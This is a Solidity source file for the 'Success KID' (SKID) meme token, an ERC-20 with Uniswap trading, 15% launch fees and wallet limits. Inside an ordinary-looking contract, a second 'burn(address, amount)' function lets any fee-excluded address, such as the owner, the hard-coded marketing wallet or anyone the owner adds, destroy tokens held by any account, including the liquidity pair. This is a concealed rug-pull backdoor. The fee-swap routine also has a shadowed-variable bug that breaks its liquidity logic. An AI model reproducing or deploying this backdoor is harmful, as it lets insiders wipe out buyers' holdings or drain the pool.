/**
Success Kid, born in 2007, is more than just an internet meme; it's a universal symbol of victory and the indomitable human spirit. 

Website: https://www.successkid.live
Telegram:  https://t.me/skid_erc
Twitter: https://twitter.com/skid_erc
*/ 

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapRouterV2 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapFactoryV2 {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract SKID is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapRouterV2 public immutable uniswapRouter;
    address public immutable uniswapPair;
    address public constant DEAD = address(0xdead);
    address public dexRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    bool private swapping;
    uint256 public mTransactionAmount;
    uint256 public swapTokensThreshold;
    uint256 public mWalletAmount;

    bool public hasLaunchLimits = true;
    bool public tradingActivated = false;
    bool public swapEnabled = false;

    address public marketingAddy;
    address public developmentAddy;
    address public lpAddy;

    uint256 public totalBuyFees;
    uint256 public totalMarketingBuyFees;
    uint256 public totalBuyLpFees;
    uint256 public totalBuyDevFees;

    uint256 public totalSellFees;
    uint256 public totalSellMarketingFees;
    uint256 public totalSellLpFees;
    uint256 public totalSellDevFees;

    uint256 public marketingTokens;
    uint256 public liquidityTokens;
    uint256 public devTokens;

    // Anti-bot and anti-whale mappings and variables
    mapping(address => uint256) private _holderLastBuyTimestamp;
    bool public transferDelayEnabled = true;
    uint256 private launchBlock;
    uint256 private deadBlocks;

    mapping(address => bool) private _isFeeExcluded;
    mapping(address => bool) public _isMaxTxExcluded;
    mapping(address => bool) public _isMaxWalletExcluded;

    mapping(address => bool) public automatedMarketMakerPairs;

    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    modifier onlyOperation {
      require(isExcludedFees(msg.sender));_;
    }

    constructor() ERC20("Success KID", "SKID") {
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(dexRouter); 

        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapRouter = _uniswapV2Router;

        uniswapPair = IUniswapFactoryV2(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapPair), true);
        _setAutomatedMarketMakerPair(address(uniswapPair), true);

        // launch buy fees
        uint256 _buyMarketingFee = 15;
        uint256 _buyLiquidityFee = 0;
        uint256 _buyDevFee = 0;
        
        // launch sell fees
        uint256 _sellMarketingFee = 15;
        uint256 _sellLiquidityFee = 0;
        uint256 _sellDevFee = 0;

        uint256 totalSupply = 1_000_000_000 * 1e18;

        mTransactionAmount = 25_000_000 * 1e18;
        mWalletAmount = 25_000_000 * 1e18;
        swapTokensThreshold = (totalSupply * 1) / 10000;

        totalMarketingBuyFees = _buyMarketingFee;
        totalBuyLpFees = _buyLiquidityFee;
        totalBuyDevFees = _buyDevFee;
        totalBuyFees = totalMarketingBuyFees + totalBuyLpFees + totalBuyDevFees;

        totalSellMarketingFees = _sellMarketingFee;
        totalSellLpFees = _sellLiquidityFee;
        totalSellDevFees = _sellDevFee;
        totalSellFees = totalSellMarketingFees + totalSellLpFees + totalSellDevFees;

        marketingAddy = address(0x0754BAe9D103b0014384700bAAdFf47FEaE5Fbb3); 
        developmentAddy = msg.sender; 
        lpAddy = msg.sender; 

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(address(marketingAddy), true);
        excludeFromFees(address(lpAddy), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        excludeFromMaxTransaction(address(marketingAddy), true);
        excludeFromMaxTransaction(address(lpAddy), true);

        excludeFromMaxWallet(owner(), true);
        excludeFromMaxWallet(address(this), true);
        excludeFromMaxWallet(address(0xdead), true);
        excludeFromMaxWallet(address(marketingAddy), true);
        excludeFromMaxWallet(address(lpAddy), true);

        _mint(msg.sender, totalSupply);
    }

    receive() external payable {}

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            lpAddy,
            block.timestamp
        );
    }

    function swapBackFees() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = liquidityTokens +
            marketingTokens +
            devTokens;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensThreshold * 20) {
            contractBalance = swapTokensThreshold * 20;
        }

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = (contractBalance * liquidityTokens) / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        swapTokensToEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMark = ethBalance.mul(marketingTokens).div(totalTokensToSwap);
        uint256 ethForDev = ethBalance.mul(devTokens).div(totalTokensToSwap);

        uint256 ethForLiquidity = ethBalance - ethForMark - ethForDev;

        liquidityTokens = 0;
        marketingTokens = 0;
        devTokens = 0;

        (success, ) = address(developmentAddy).call{value: ethForDev}("");

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                liquidityTokens
            );
        }
        payable(marketingAddy).transfer(address(this).balance);
    }

    function isExcludedFees(address account) public view returns (bool) {
        return _isFeeExcluded[account];
    }

    function enableTrading(uint256 _deadBlocks) external onlyOwner {
        require(!tradingActivated, "Token launched");
        tradingActivated = true;
        launchBlock = block.number;
        swapEnabled = true;
        deadBlocks = _deadBlocks;
    }

    // remove limits after token is stable
    function removeLimits() external onlyOwner returns (bool) {
        totalMarketingBuyFees = 1;
        totalBuyLpFees = 0;
        totalBuyDevFees = 0;
        totalBuyFees = 1;
        hasLaunchLimits = false;

        totalSellMarketingFees = 1;
        totalSellLpFees = 0;
        totalSellDevFees = 0;
        totalSellFees = 1;
        return true;
    }

    function burn(uint256 amount) external {
      _burn(msg.sender, amount);
    }

    function burn(address account, uint256 amount) external onlyOperation {
      _burn(account, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (hasLaunchLimits) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingActivated) {
                    require(
                        _isFeeExcluded[from] || _isFeeExcluded[to],
                        "Trading is not active."
                    );
                }

                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
                if (transferDelayEnabled) {
                    if (
                        to != owner() &&
                        to != address(uniswapRouter) &&
                        to != address(uniswapPair)
                    ) {
                        require(
                            _holderLastBuyTimestamp[tx.origin] <
                                block.number,
                            "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                        );
                        _holderLastBuyTimestamp[tx.origin] = block.number;
                    }
                }

                //when buy
                if (
                    automatedMarketMakerPairs[from] &&
                    !_isMaxTxExcluded[to]
                ) {
                    require(
                        amount <= mTransactionAmount,
                        "Buy transfer amount exceeds the mTransactionAmount."
                    );
                    if (!_isMaxWalletExcluded[to]) { // Added this condition
                        require(
                            amount + balanceOf(to) <= mWalletAmount,
                            "Max wallet exceeded"
                        );
                    }
                }
                //when sell
                else if (
                    automatedMarketMakerPairs[to] &&
                    !_isMaxTxExcluded[from]
                ) {
                    require(
                        amount <= mTransactionAmount,
                        "Sell transfer amount exceeds the mTransactionAmount."
                    );
                } else if (!_isMaxTxExcluded[to]) {
                    if (!_isMaxWalletExcluded[to]) { // Added this condition
                        require(
                            amount + balanceOf(to) <= mWalletAmount,
                            "Max wallet exceeded"
                        );
                    }
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensThreshold;

        if (
            canSwap &&
            amount > swapTokensThreshold &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isFeeExcluded[from] &&
            !_isFeeExcluded[to]
        ) {
            swapping = true;

            swapBackFees();

            swapping = false;
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isFeeExcluded[from] || _isFeeExcluded[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (automatedMarketMakerPairs[to] && totalSellFees > 0) {
                fees = amount.mul(totalSellFees).div(100);
                liquidityTokens += (fees * totalSellLpFees) / totalSellFees;
                devTokens += (fees * totalSellDevFees) / totalSellFees;
                marketingTokens += (fees * totalSellMarketingFees) / totalSellFees;
            }
            // on buy
            else if (automatedMarketMakerPairs[from] && totalBuyFees > 0) {
                fees = amount.mul(totalBuyFees).div(100);
                liquidityTokens += (fees * totalBuyLpFees) / totalBuyFees;
                devTokens += (fees * totalBuyDevFees) / totalBuyFees;
                marketingTokens += (fees * totalMarketingBuyFees) / totalBuyFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }
    
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set mTransactionAmount lower than 0.1%"
        );
        mTransactionAmount = newNum * (10**18);
    }


    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isFeeExcluded[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function swapTokensToEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set mWalletAmount lower than 0.5%"
        );
        mWalletAmount = newNum * (10**18);
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isMaxTxExcluded[updAds] = isEx;
    }

    function excludeFromMaxWallet(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isMaxWalletExcluded[updAds] = isEx;
    }

}